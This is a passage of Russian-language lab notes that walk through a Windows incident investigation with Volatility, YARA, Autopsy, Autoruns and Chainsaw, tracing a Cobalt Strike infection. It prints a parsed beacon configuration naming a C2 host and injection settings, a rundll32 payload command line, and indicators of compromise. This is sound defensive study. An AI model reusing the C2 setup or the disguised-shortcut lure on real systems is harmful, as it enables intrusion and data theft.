+            2784    chrome.exe          "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-subtype=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=2196 --fieldtrial-handle=1888,i,11977534670868737611,7243353188915732905,262144 /prefetch:8...SNIP... 
+            4040    winpmem_mini_x.exe  "C:\Program Files\Velociraptor\Tools\winpmem_mini_x64_rc2.exe" "C:\ProgramFiles\Velociraptor\Tools\tmp2081306188.raw"
+            ...SNIP... 
+
+        Среди все процессов, которе могут вызвать подозрение, особо подозрительными выглядят 
+
+            -   3648 
+                Запущен с использованием нерелевантной библиотеки 
+
+            -   6744 
+                Использование PowerShell с закодированной командой 
+
+        ////////////////////////////////////////////////
+        /// Dumping Process Memory & Leveraging YARA ///
+        //////////////////////////////////////////////// 
+
+        Посколько мы определили, что процесс 3648 выглядит весьма подозрительнм, то давайте комнем немного глубже в его сторону. 
+        Сперва мы попробуем извлечь все связанные с ним страницы памяти в процессе в отдельный файл
+        Для этого используем следующий плагин   -   windows.memmap 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.memmap --pid 3648 --dump 
+
+        Я не буду демонстрировать весь вывод данной команды, так как он нереально огромный
+        А покажу лишь его начальную часть 
+
+            Volatility 3 Framework 2.5.0 
+
+            Virtual         Physical        Size    Offset in File      File output 
+
+            ...SNIP...
+            0x6bac1000      0x3c125000      0x1000  0x0                 pid.3648.dmp
+            0x6bac2000      0x4b6a7000      0x1000  0x1000              pid.3648.dmp
+            0x6bb0c000      0x21ea4000      0x1000  0x2000              pid.3648.dmp
+            0x6bb0d000      0x5bfa2000      0x1000  0x3000              pid.3648.dmp
+            0x7ffe0000      0x10af000       0x1000  0x4000              pid.3648.dmp
+            ...SNIP... 
+
+
+        Из вывода можно понять, что весь рещультат сохранен в файл "pid.3648.dmp", который мы может просмотреть позже 
+
+        Чтобы получить больше подробностей о процессе с идентификатором 3648, мы можем использовать YARA.
+        Используя цикл PowerShell, мы можем систематически сканировать дамп процесса, используя все доступные правила репозитория правил YARA (https://github.com/Neo23x0/signature-base/tree/master) 
+
+        Сперва определил переменную $rules, которыую мы затем будем использовать в нашем цикле 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> $rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150win64\rules | Select-Object -Property Name 
+
+        Затем запустим сам цикл и посмотрим, что он нам покажет 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.22150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp} 
+
+                HKTL_CobaltStrike_Beacon_Strings C:\Users\johndoe\Desktop\pid.3648.dmp
+                HKTL_CobaltStrike_Beacon_4_2_Decrypt C:\Users\johndoe\Desktop\pid.3648.dmp
+                HKTL_Win_CobaltStrike C:\Users\johndoe\Desktop\pid.3648.dmp
+                CobaltStrike_Sleep_Decoder_Indicator C:\Users\johndoe\Desktop\pid.3648.dmp
+                WiltedTulip_ReflectiveLoader C:\Users\johndoe\Desktop\pid.3648.dmp
+                ...SNIP...
+
+        Результат оказался весьма интересным 
+        Было обнаружено несколько отсылок к CobaltStrike famework (https://www.cobaltstrike.com/) 
+
+        ///////////////////////////////
+        /// Identifying Loaded DLLs ///
+        /////////////////////////////// 
+
+        Вернемся, еще раз, к списку запущенные командный процессов (Process Command Lines)
+        Как мы уже определили, была испольщованна нерелевантная библиотека payload.dll для процесса 3648
+        При этом функция Start служит явным признаком выполнения payload.dll. 
+
+        Чтобы углубить наше понимание связанных DLL, мы можем использовать следующий плагин     -   windows.dlllist 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.dlllist --pid 3648 
+
+            Volatility 3 Framework 2.5.0 
+
+            PID     Process         Base                Size        Name                            Path                                                LoadTime                        File output 
+
+            3648    rundll32.exe    0x7ff782070000      0x17000     rundll32.exe                    C:\Windows\System32\rundll32.exe                    2023-08-10 09:15:14.000000      Disabled 
+            3648    rundll32.exe    0x7ffaa36b0000      0x1f8000    -                               -                                                   2023-08-10 09:15:14.000000      Disabled 
+            3648    rundll32.exe    0x7ffaa2400000      0xbf000     KERNEL32.DLL                    C:\Windows\System32\KERNEL32.DLL                    2023-08-10 09:15:14.000000      Disabled 
+            ...SNIP... 
+            3648    rundll32.exe    0x6bac0000          0x4f000     payload.dll                     E:\payload.dll                                      2023-08-10 09:15:14.000000      Disabled 
+            3648    rundll32.exe    0x7ffaa14a0000      0x22000     win32u.dll                      C:\Windows\System32\win32u.dll                      2023-08-10 09:15:14.000000      Disabled 
+            3648    rundll32.exe    0x7ffaa2900000      0x2c000     GDI32.dll                       C:\Windows\System32\GDI32.dll                       2023-08-10 09:15:14.000000      Disabled 
+            3648    rundll32.exe    0x7ffaa1330000      0x115000    gdi32full.dll                   C:\Windows\System32\gdi32full.dll                   2023-08-10 09:15:14.000000      Disabled 
+            ...SNIP... 
+            3648    rundll32.exe    0x7ffa86730000      0x17000     ondemandconnroutehelper.dll     C:\Windows\SYSTEM32\ondemandconnroutehelper.dll     2023-08-10 09:15:15.000000      Disabled 
+            3648    rundll32.exe    0x7ffa99bd0000      0x10a000    winhttp.dll                     C:\Windows\SYSTEM32\winhttp.dll                     2023-08-1009:15:15.000000       Disabled 
+            3648    rundll32.exe    0x7ffa9ec70000      0x12000     kernel.appcore.dll              C:\Windows\SYSTEM32\kernel.appcore.dll              2023-08-10 09:15:15.000000      Disabled 
+            3648    rundll32.exe    0x7ffa9a9a0000      0xb000      WINNSI.DLL                      C:\Windows\SYSTEM32\WINNSI.DLL                      2023-08-10 09:15:15.000000      Disabled 
+
+        Мы замечаем E:\payload.dll в выводе.
+        Исходя из его расположения, мы предполагаем, что он мог исходить из внешнего USB или, возможно, из смонтированного файла ISO. 
+
+        Мы пометим этот DLL для более глубокого анализа позже. 
+
+        ///////////////////////////
+        /// Identifying Handles ///
+        /////////////////////////// 
+
+        Далее давайте определим файлы и записи реестра, к которым обращается подозрительный процесс, с помощью плагина   -   windows.handles 
+
+        Когда процессу необходимо прочитать или записать файл, он не взаимодействует напрямую с данными файла на диске. 
+        Вместо этого процесс запрашивает у операционной системы открытие файла, а в ответ ОС предоставляет дескриптор файла. 
+        Этот дескриптор по сути является билетом, который предоставляет процессу разрешение на выполнение операций с этим файлом. 
+        Каждая последующая операция, которую процесс выполняет с этим файлом — будь то чтение, запись или закрытие — выполняется через этот дескриптор. 
+
+        Открытые дескрипторы могут быть золотой жилой для криминалистов. 
+        Изучая список открытых дескрипторов, мы можем определить, какие процессы обращались к каким файлам или разделам реестра в определенный момент времени. 
+        Это может дать представление о поведении потенциально вредоносного программного обеспечения или действиях пользователя. 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.handles --pid 3648 
+
+        Вывод достаточно большой, поэтому я продемоснтрирую только особо интересные его части (на данном этапе) 
+
+            Volatility 3 Framework 2.5.0 
+
+            PID     Process         Offset              HandleValue Type GrantedAccess Name 
+
+            ...SNIP... 
+            3648    rundll32.exe    0x800adf624d20      0x118 WindowStation 0xf037f WinSta0 
+            3648    rundll32.exe    0x800ae2f02770      0x11c File 0x100001 \Device\HarddiskVolume3\Windows\System32\enUS\rundll32.exe.mui 
+            3648    rundll32.exe    0x800ae40cd130      0x120 EtwRegistration 0x804...SNIP... 
+            3648    rundll32.exe    0x800ae0578070      0x468 ALPC Port 0x1f0001 
+            3648    rundll32.exe    0x800ae4dbb890      0x46c Semaphore 0x1f0003 SM0:3648:120:WilError_03_p0h3648 rundll32.exe 0x800ae4439e10 0x474 File 0x100001 \Device\HarddiskVolume3\Windows\System32\enUS\mswsock.dll.mui 
+            3648    rundll32.exe    0x800ae22d1f60      0x480 Event 0x1f0003 
+            3648    rundll32.exe    0x800ae476a630      0x484 File 0x120089 \Device\NamedPipe\
+            3648    rundll32.exe    0xdf853c619a50      0x488 Section 0x4 
+            3648    rundll32.exe    0x800ae1858860      0x48c Event 0x1f0003 
+            3648    rundll32.exe    0x800ae1063910      0x494 EtwRegistration 0x8043648 rundll32.exe 0xdf8541a0b4c0 0x498 Key 0x8 USER\S-1-5-21-414731039-2985344906-42663261701000\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION 
+            3648    rundll32.exe    x800ae0235080       0x574 Thread 0x1fffff Tid 1748 Pid 3648 
+            3648    rundll32.exe    0x800ae44dbc70      0x5b4 File 0x100020 \Device\HarddiskVolume3\Users\johndoe\Desktop
+            ...SNIP...
+
+        Очевидно (судя по \Device\HarddiskVolume3\Users\johndoe\Desktop), что процесс взаимодействует с определенными файлами, расположенными на рабочем столе, что также требует более пристального внимания. 
+
+        /////////////////////////////////////
+        /// Identifying Network Artifacts ///
+        ///////////////////////////////////// 
+
+        Помимо изучения процессов, будет не лишним и проанализировать сетевую активность
+        Для этого нам понадобиться плагин  -    windows.netstat, который может просматривать структуры отслеживания сети, помогая нам анализировать детали соединения в образе памяти.
+        Или плагин  -   windows.netscan, для более полного анализа
+        ***     Опять же я не буду демонстрировать весь вывод обоих плагинов 
+                А пока только записи, относящиеся к процессу 3648 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.netstat 
+
+            Volatility 3 Framework 2.5.0 
+
+            Offset          Proto   LocalAddr           LocalPort   ForeignAddr         ForeignPort     State           PID     Owner           Created 
+
+            ...SNIP... 
+            0x800ae0e914b0  TCPv4   192.168.152.134     52810       44.214.212.249      80              LAST_ACK        3648    rundll32.exe    2023-08-10 09:33:36.000000 
+            ...SNIP... 
+            0x800ae113e010  TCPv4   192.168.152.134     53118       44.214.212.249      80              ESTABLISHED     3648    rundll32.exe    2023-08-10 09:35:41.000000 
+            ...SNIP... 
+
+            PS C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.rawwindows.netscan 
+
+            Volatility 3 Framework 2.5.0 
+
+            Offset          Proto   LocalAddr   LocalPort   ForeignAddr     ForeignPort     State       PID     Owner               Created 
+
+            ...SNIP... 
+            0x800ae0e44b40  UDPv4   0.0.0.0     0           *               0                           3648    rundll32.exe        2023-08-10 00:32:02.000000 
+            0x800ae0e44b40  UDPv6   ::          0           *               0                           3648    rundll32.exe        2023-08-10 00:32:02.000000 
+            ...SNIP... 
+
+        Как мы можем заметить, подозрительный процесс (PID 3648) взаимодействует с 44.214.212.249 через порт 80 
+
+===================================================================== 
+* Rapid Triage Data Examination & Analysis *
+******************************************** 
+
+    +++++++++++++++++++++++++++ 
+    + Disk Image with AUTOPSY +
+    +++++++++++++++++++++++++++ 
+
+    В большинстве примеров мы будем использовать AUTOPSY 
+    Однако, инода нам придется обратиться к другим утилитам, чтобы копнуть чуть глубже и найти сигнатуры, которыемы проверим через AUTOPSY 
+    Среди таких утилит будут    -   Autoruns (модуль из сета Sysinternals) и Python-скрипт 
+
+        //////////////////////////////
+        /// Searching for Keywords ///
+        ////////////////////////////// 
+
+        Сперва откроем Autopsy и загрузим case-file, который был предварительно создан для нас владельцем данной песочницы (case-file имеет расширение *.aut)
+        Однако, Вы можете создать case-file сами 
+
+        После загрузки case-file нам надо отследить все упоминания, относящиеся к payload.dll
+        Для этого запустим поиск по ключевому слову (Keyword Search) с параметром "Substring Match". 
+
+        Так как Autopsy - это графическая утилита, то к сожалению я не смогу продемонстрировать вывод экранаТем не менее, результат выдает 29 совпадений
+        Рекомндуется отфильтровать совпадения по времени их создания 
+        После чего, особое внимание стоит обратить на следуюшие 3 колонки/столбца: 
+
+            -   Name 
+            -   Keyword Search 
+            -   Locaion 
+
+        Проанализировав столбец "Location" мы можем увидеть, что некоторые совпадения были обнаружены в файлах расположенных в каталоге-C:\Users\johndoe\Downloads
+        Это дайет нам основание полагать, что эти файлы (в нашем случае файлы называются Finance08062023.iso) былискачаны из интернета 
+
+        Также, стоблец "Location" содержал еще одну запись  -   C:\Users\<user_name>\AppData\Local\Google\Chrome\UserData\Default\Cache\Cache_Data 
+        Это говорит нам о том, что файл (в нашем случае это - f_000003) иммет отношение к кешу Chrome что файл ISO былзагружен через браузер. 
+
+        Мы можем извлечь эти файлы для последующего изучения, щелкнув правой кнопкой мыши и выбрав "Extract File(s)" 
+
+        ///////////////////////////////////////////////////////////////
+        /// Identifying Web Download Information & Extracting Files ///
+        /////////////////////////////////////////////////////////////// 
+
+        Идем далее 
+
+        Для извлечения сведений о веб-загрузках мы воспользуемся возможностями Alternate Data Stream (ADS).
+        В Autopsy мы можем получить доступ к каталогу Downloads, чтобы найти наш файл. 
+
+        Для этого нам надо развернуть список под названием "Data Source", который назодится в самой левой части рабочей области 
+        Здесь информация .Zone.Identifier, любезно предоставленная атрибутами файла Alternate Data Stream (ADS), бесценна. 
+        Этот идентификатор раскрывает интернет-происхождение файла, и мы можем точно определить HostUrl, с которого был получен вредоносный ISO-образ. 
+
+        Проанализировав данные с вкладки "Text" по файлу Finance08062023.iso:Zone.Identifier мы приудем к выводу, что данный файл бл скачан с ресурса под названием  -   letsgohunt.site 
+
+        После извлечения данного файла, мы можем просмотреть его содержимое, щелкнув на нем 2 раза
+        Так как это *.iso файл, то после того, как вы щелкните на него, автоматически будет смонирован диск (в нашемслуче это диск E:\)
+        Он содержал в себе 2 других файла: 
+
+            -   Document.lnk 
+            -   payload.dll 
+
+        Просмотр свойств файла Document.lnk показывает нам, что это замаскированная ссылка, которая запускает файл rundll32.exe с использованием потенциально-вредоносной библиотеки payload.dll , хотя и выглядит как документ, который можно просомтреть 
+        !!! Поэтому, ВСЕГДА перед тем как дважды щелкнуть на извлеченный файл, СПЕРВА проверьте его свойства
+            Вдруг там вшита скрытая комнада для исполнения чего-то другого 
+
+        /////////////////////////////////////////////////////////////////////////
+        /// Extracting Cobalt Strike Beacon Configuration using Python script ///
+        ///////////////////////////////////////////////////////////////////////// 
+
+        Вспоминая тот факт, что при анализе дампа памяти посредством правил YARA, нами были обнаружены сигнатуры, указываюшие на Cobalt Strike 
+        Мы можем использовать специальный Python-скрипт, который проанализирует подозрительную библиотеку payload.dll на предмет наличия "beacon"
+        *** Напомню, beaconing  -   это когда вредоносное ПО связывается с сервером C2, запрашивая инструкции или извлекая собранные данные в течение некоторого заранее определенного асинхронного интервала. 
+            Сервер C2 размещает инструкции для вредоносного ПО, которые затем выполняются на зараженной машинепосле регистрации вредоносного ПО. 
+
+        Вот интренет ресурсы, где вы можете ознакомиться с beaconing, а также скачать данный Python-скрипт 
+
+            https://www.cobaltstrike.com/product/features/beacon
+            https://github.com/Sentinel-One/CobaltStrikeParser 
+
+            PS C:\Folder\where\you\store\your\CobaltStrikeParser-master\script> python parse_beacon_config.py E:\payload.dll 
+
+                BeaconType                      -   HTTP 
+                Port                            -   80 
+                SleepTime                       -   60000 
+                MaxGetSize                      -   1048576 
+                Jitter                          -   0 
+                MaxDNS                          -   Not Found 
+                PublicKey_MD5                   -   1a5779a38fe8b146455e5bf476e39812 
+                C2Server                        -   letsgohunt.site,/load
+                UserAgent                       -   Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASP)
+                HttpPostUri                     -   /submit.php
+                Malleable_C2_Instructions       -   Empty
+                HttpGet_Metadata                -   Metadata 
+                                                        base64 
+                                                        header "Cookie" 
+                HttpPost_Metadata               -   ConstHeaders 
+                                                        Content-Type: application/octet-stream
+                                                    SessionId 
+                                                        parameter "id"
+                                                    Output
+                                                        print
+                PipeName                        -   Not Found 
+                DNS_Idle                        -   Not Found 
+                DNS_Sleep                       -   Not Found 
+                SSH_Host                        -   Not Found 
+                SSH_Port                        -   Not Found 
+                SSH_Username                    -   Not Found 
+                SSH_Password_Plaintext          -   Not Found 
+                SSH_Password_Pubkey             -   Not Found 
+                SSH_Banner HttpGet              -
+                Verb                            -   GET 
+                HttpPost_Verb                   -   POST 
+                HttpPostChunk                   -   0 
+                Spawnto_x86                     -   %windir%\syswow64\rundll32.exe
+                Spawnto_x64                     -   %windir%\sysnative\rundll32.exe
+                CryptoScheme                    -   0 
+                Proxy_Config                    -   Not Found 
+                Proxy_User                      -   Not Found 
+                Proxy_Password                  -   Not Found 
+                Proxy_Behavior                  -   Use IE settings
+                Watermark_Hash                  -   Not Found 
+                Watermark                       -   0 
+                bStageCleanup                   -   False 
+                bCFGCaution                     -   False 
+                KillDate                        -   0 
+                bProcInject_StartRWX            -   True 
+                bProcInject_UseRWX              -   True 
+                bProcInject_MinAllocSize        -   0 
+                ProcInject_PrependAppend_x86    -   Empty
+                ProcInject_PrependAppend_x64    -   Empty
+                ProcInject_Execute              -   CreateThread
+                                                    SetThreadContext 
+                                                    CreateRemoteThread 
+                                                    RtlCreateUserThread 
+                ProcInject_AllocationMethod     -   VirtualAllocEx 
+                bUsesCookies                    -   True 
+                HostHeader headersToRemove      -   Not Found 
+                DNS_Beaconing                   -   Not Found 
+                DNS_get_TypeA                   -   Not Found 
+                DNS_get_TypeAAAA                -   Not Found 
+                DNS_get_TypeTXT                 -   Not Found 
+                DNS_put_metadata                -   Not Found 
+                DNS_put_output                  -   Not Found 
+                DNS_resolver                    -   Not Found 
+                DNS_strategy                    -   round-robin 
+                DNS_strategy_rotate_seconds     -   -1 
+                DNS_strategy_fail_x             -   -1 
+                DNS_strategy_fail_seconds       -   -1 
+                Retry_Max_Attempts              -   Not Found 
+                Retry_Increase_Attempts         -   Not Found 
+                Retry_Duration                  -   Not Found 
+
+        /////////////////////////////////////////////
+        /// Identifying Persistence with Autoruns ///
+        ///////////////////////////////////////////// 
+
+        Для выявления идентификаторов persistance в системе рекомендуется проверить файл *.arn с помощью инструмента Autoruns. 
+        Данный инструмент (Autoruns)    -   программное обеспечение, предназначенное для идентификации программного обеспечения, настроенного на автоматический запуск при загрузке устройства или входе пользователя в систему
+        Оно явялется частью набора Sysinternals, но также может быть установленно отдельно 
+
+        Запускаем Autoruns и выбираем нужный нам *.arn файл 
+        Во вкладке Logon мы можем обнаружить запись LocalSystem со следующими данными: 
+
+            -   Registry path: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
+            -   Image path: C:\ProgramData\svchost.exe 
+            -   Timestamp: Thu Aug 10 11:25:51 2023 (this is a local timestamp, UTC: 09:25:51) 
+
+        Кроме того, в тойже вкладке был обнаружен (выделен) странный исполняемый файл photo433.exe.
+
+        Он находился в каталоге -   C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\ 
+
+        Сперва определим ХЭШ этого файла, а также проверим наш *.aut образ на предмет наличия упоминаний по этому файлу 
+        *** Вообще, очень рекомндую взять за правило определять ХЭШ любого найденного файла, который вызывает подозрение и проветь этот ХЭШ в инетренет (к примеру через VirusTotal)
+
+        Для определения ХЭШа использует PowerShell 
+
+            PS C:\Users\johndoe> Get-FileHash -Algorithm SHA256"C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\photo443.exe" 
+
+            Algorithm       Hash                                                                    Path 
+
+            SHA256          E986DAA66F2E8E4C47E8EAA874FCD4DCAB8045F1F727DAF7AC15843101385194        C:\Users\johndoe\Desktop\kapefiles\....\photo443.exe 
+
+        Результат на VirusTotal весьма не утишителен    -   59 из 73 совпадений (основная категория - trojan) 
+
+        Еще одна вкладка, которую нам следует изучить - Scheduled Tasks
+        Просматривая ее мы должны обращать внимание на различного рода несостыковки и/или пропуски информации
+        К примеру, в нашем примере было 2 записи (относящиеся к OneDrive), которые имели некоторую подозрительную информацию: 
+
+            -   не имели информацию по колонке Publisher или она была помечена как Not Verified 
+            -   не имели информацию по колонке Description или она содержит информацию, которая разительно отличается от других и/или выглядит подохрительно 
+            -   колонка Image Path указывает на нестандартное расположения файла, ответственного за запланированное событие или имеет пометку File Not Found 
+
+        В действительности, оригинальные файл (созданный разработчиком ПО) должен всегда находится в определнном месте, установленным разработчиком этого ПО
+        Особенно это касается системных файлов Windows 
+        Поэтому, если Вы видите, что файл ответсвенны за создание запланированного события находится в неположенном месте, то это должно вызвать у вас по крайней мере подозрение
+        Если же Вы не уверены в достоверности расположения файла, то всегда можно спросить всемогущий гугл или чатГПТ 
+
+        //////////////////////////
+        /// Analyzing MFT Data ///
+        ////////////////////////// 
+
+        Как мы помним, про просмотре вкладки Logon, запись LocalSystem располагалась тут - C:\ProgramData\svchost.exe
+        *** Расположение файла svchost.exe выглядит подозрительным, так как его родное местоположение в папках system32 и SysWOW64
+        Чтож, давайте погрузимся в C:\ProgramData с помощью Autopsy, чтобы найти этот файл 
+
+        Как только находим этот файл, то проверяем вкладку File Metadata 
+
+            Metadata 
+            Name:                   /img_fulldisk.raw.001/ProgramData/svchost.exe
+            Type:                   File System
+            MIME Type:              application/x-msdownload
+            Size:                   288256 
+            File Name Allocation:   Allocated 
+            Metadata Allocation:    Allocated 
+            Modified:               016-08-14 11:14:00 UTC 
+            Accessed:               2023-08-10 09:25:48 UTC 
+            Created:                2023-08-10 09:25:48 UTC 
+            Changed:                2023-08-10 09:26:46 UTC 
+            MD5:                    79d63e039bf84c80fc49bc414c4b4449 
+            SHA-256:                edec4e222880fd57129bcab979e77df73df0b86739d96de95913b2393897bdaa 
+            Hash Lookup Results:    UNKNOWN 
+            Internal ID:             3663 
+
+            From The Sleuth Kit istat Tool 
+            MFT Entry Header Values:
+            Entry:                      1869 
+            Sequence:                   3 
+            $LogFile Sequence Number:   313475236 
+            Allocated File 
+            Links:                      1     
+
+            $STANDARD_INFORMATION Attribute Values: 
+            Flags: Archive, Not Content Indexed
+            Owner ID:                                   0 
+            Security ID:                                2292 (S-1-5-32-544)
+            Last User Journal Update Sequence Number:   29386200
+            Created:                                    2023-08-10 09:25:48.088921900 (Coordinated Universal Time)
+            File Modified:                              2016-08-14 11:14:00.000000000 (Coordinated Universal Time)
+            MFT Modified:                               2023-08-10 09:26:46.019250700 (Coordinated Universal Time)
+            Accessed:                                   2023-08-10 09:25:48.092298800 (Coordinated Universal Time) 
+
+
+            $FILE_NAME Attribute Values: 
+            Flags:                  Archive, Not Content Indexed
+            Name:                   svchost.exe 
+            Parent MFT Entry:       1383 
+            Sequence:               1
+            Allocated Size:         0 
+            Actual Size:            0 
+            Created:                2023-08-10 09:25:48.088921900 (Coordinated Universal Time)
+            File Modified:          2023-08-10 09:25:48.088921900 (Coordinated Universal Time)
+            MFT Modified:           2023-08-10 09:25:48.088921900 (Coordinated Universal Time)
+            Accessed:               2023-08-10 09:25:48.088921900 (Coordinated Universal Time) 
+
+
+            Attributes: 
+            Type:               $STANDARD_INFORMATION (16-0) 
+            Name:               N/A 
+            Resident size:      72
+            Type:               $FILE_NAME (48-2) 
+            Name:               N/A 
+            Resident            size: 88
+            Type:               $DATA (128-3) 
+            Name:               N/A 
+            Non-Resident size:  288256 
+            init_size:          288256
+            Starting address:   617900 
+            length:             71 
+
+        Можете ли вы заметить какие-либо подозриельные моменты? 
+
+            1)  В частности, есть несоответствие при сопоставлении значения $FILE_NAME MFT Modified со значением $STANDARD_INFORMATION File Modified. 
+
+            2)  Временная метка $STANDARD_INFORMATION File Modified — это то, с чем пользователь обычно сталкивается при просмотре свойств файла. 
+                Это может заставить кого-то поверить, что файл существует уже некоторое время и может не быть связан с какой-либо недавней активностью. 
+                Однако $FILE_NAME MFT Modified содержит подлинную временную метку, раскрывающую фактическую историю файла. 
+
+        Это вид изменеиня свойств файла называется  -   Timestomping
+        Timestomping — это хитрый метод, при котором злоумышленники изменяют временные метки файла, чтобы он слился с окружающими файлами, что затрудняет обнаружение для криминалистических инструментов и следователей.
+        Получив доступ к метаданным файла (вкладка File Metadata), мы можем точно определить атрибуты MFT (Master FileTable), которые покажут подлинную дату изменения. 
+
+        ///////////////////////////
+        /// Analyzing SRUM Data ///
+        /////////////////////////// 
+
+        Если мы просмотрим еще раз то, что мы обнаружили к текущиму моменту (особенно когда анализировали дамп памяти), то увидим, что вредоносный исполняемый файл имел открытый дескриптор, направленный на папку Desktop.
+        Это было обнаружено, когда мы импользовали плагин windows.handles (см выше) 
+
+        С помощью Autopsy мы замечаем файл с именем users.db, находящийся   -   /img_fulldisk.raw.001/Users/johndoe/Desktop/users.db
+        Учитывая обстоятельства, вполне вероятно, что злоумышленник намеревался выкачать эти данные из системы. 
+
+        Чтобы проверить нашу гипотезу, давайте пройдемся по Data Artifacts и перейдем к разделу Run Programs в Autopsy.
+        Наш основной фокус для анализа сетевых метаданных сосредоточен на: 
+
+            Source Name     -   SRUDB.dat 
+            Program Name    -   \windows\system32\rundll32.exe
+            User Name       -   johndoe 
+
+        Как мы модем заметить было отправленно огромное количество байтов данный (в нашем случае это было 430526981байт) 
+
+    +++++++++++++++++++++++++++++++++++++ 
+    + Windows Event Logs using CHAINSAW +
+    +++++++++++++++++++++++++++++++++++++ 
+
+    В нашем стремлении понять произошедшие события давайте воспользуемся утилитой Chainsaw для анализа журналов событий Windows 
+    Наша цель — точно определить ключевые события, которые произошли во время нашей временной шкалыинцидента. 
+    Собирая воедино доказательства, мы можем построить всеобъемлющее повествование об атаке, от ее начала докульминации. 
+
+        PS C:\Users\johndoe\Desktop\chainsaw> chainsaw_x86_64-pc-windows-msvc.exe hunt"C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs" -s sigma/ --mapping mappings/sigma-eventlogs-all.yml -r rules/ --csv --output output_csv
+
+         ██████╗ ██╗  ██╗  █████╗  ██╗ ███╗   ██╗ ███████╗  █████╗  ██╗     ██╗ 
+        ██╔════╝ ██║  ██║ ██╔══██╗ ██║ ████╗  ██║ ██╔════╝ ██╔══██╗ ██║     ██║ 
+        ██║      ███████║ ███████║ ██║ ██╔██╗ ██║ ███████╗ ███████║ ██║  █╗ ██║ 
+        ██║      ██╔══██║ ██╔══██║ ██║ ██║╚██╗██║ ╚════██║ ██╔══██║ ██║ ███╗██║ 
+        ╚██████╗ ██║  ██║ ██║  ██║ ██║ ██║ ╚████║ ███████║ ██║  ██║ ╚███╔███╔╝
+         ╚═════╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═╝  ╚══╝╚══╝ 
+        By Countercept (@FranticTyping, @AlexKornitzer) 
+
+        [+] Loading detection rules from: rules/, sigma/
+        [!] Loaded 2872 detection rules (329 not loaded)
+        [+] Loading forensic artefacts from: C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs(extensions: .evt, .evtx)
+        [+] Loaded 142 forensic artefacts (66.6 MB)
+        [+] Hunting: [========================================] 142/142 -
+        [+] Created account_tampering.csv[+] Created antivirus.csv[+] Created sigma.csv 
+
+        [+] 2212 Detections found on 1809 documents 
+
+    Как мы можем заметить из вывода - было создано 3 csv-файла, которые были сохранены в папку output_csvтекущего каталога (C:\Users\johndoe\Desktop\chainsaw\output_csv). 
+
+        /////////////////
+        /// sigma.csv ///
+        ///////////////// 
+
+        При изучении sigma.csv (выберите Фиксированную ширину в Параметрах разделителя) мы наблюдаем следующиеоповещения, среди прочих, связанных с инцидентом*** 
+        Для быстрого поиска использую функцию "Find" и ищем по ключевому слову 
+
+            -   CobaltStrike Load by rundll32 
+
+                2023-08-10T09:15:14.099640+00:00,CobaltStrike Load by Rundll32;LOLBIN From Abnormal Drive;Rundll32 WithSuspicious Parent Process,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,1,2192,DESKTOP-VQJOLVH,"CommandLine:'""C:\Windows\System32\rundll32.exe"" payload.dll,StartW'
+                Company: Microsoft Corporation
+                CurrentDirectory: E:\
+                Description: Windows host process (Rundll32)
+                FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+                Hashes: SHA1=DD399AE46303343F9F0DA189AEE11C67BD868222,MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC
+                Image: C:\Windows\System32\rundll32.exe
+                IntegrityLevel: Medium
+                LogonGuid: D875E288-2DE1-64D4-1801-020000000000
+                LogonId: '0x20118'
+                OriginalFileName: RUNDLL32.EXE
+                ParentCommandLine: explorer.exe
+                ParentImage: C:\Windows\explorer.exe
+                ParentProcessGuid: D875E288-2FC0-64D4-2F01-000000000300 
+                ParentProcessId: 7148 
+                ParentUser: DESKTOP-VQJOLVH\johndoe
+                ProcessGuid: D875E288-AAA2-64D4-7602-000000000300 
+                ProcessId: 3648 
+                Product: Microsoft® Windows® Operating System
+                RuleName: technique_id=T1204,technique_name=User Execution
+                TerminalSessionId: 1 
+                User: DESKTOP-VQJOLVH\johndoe
+                UtcTime: 2023-08-10 09:15:14.097 
+
+            -   CobaltStrike Named Pipe
+                Функциональность CobaltStrike Named Pipe обеспечивает скрытую связь между злоумышленниками ивзломанными системами, облегчая скрытные действия после взлома 
+
+                2023-08-10T09:15:14.125534+00:00,CobaltStrike NamedPipe,C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Windows\System32\winevt\Logs\Microsoft-WindowsSysmon%254Operational.evtx,1,Microsoft-Windows-Sysmon,17,2193,DESKTOP-VQJOLVH,"EventType: CreatePipe
+                Image: C:\Windows\System32\rundll32.exe
+                PipeName: \MSSE-7725-server
